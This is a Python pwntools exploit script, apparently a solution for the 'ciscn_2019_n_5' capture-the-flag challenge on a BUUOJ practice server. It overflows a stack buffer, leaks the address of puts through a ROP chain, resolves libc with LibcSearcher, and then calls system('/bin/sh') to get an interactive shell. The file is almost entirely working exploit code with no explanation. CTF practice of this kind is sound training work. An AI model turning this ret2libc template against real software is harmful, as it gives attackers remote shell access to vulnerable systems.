#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'ciscn_2019_n_5'
remote_addr = 'node5.buuoj.cn'
port = 26266

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda x: p.recvline(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    prdi = 0x400713
    ret = 0x4004c9
    main = 0x400636
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    sla('name\n', 'aaa')
    payload = b'a'*0x20 + b'b'*8 + p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)
    sla(b'me?\n',payload)
    puts_addr = u64(rc(6).ljust(8, b'\x00'))
    show(b'puts_addr--> ' + bytes(hex(puts_addr),encoding='utf-8'))
    libc = LibcSearcher('puts', puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    sla('name','aaa')
    payload = b'a'*0x20 + b'b'*8 + p64(prdi) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
    sla('me?',payload)
    p.interactive()
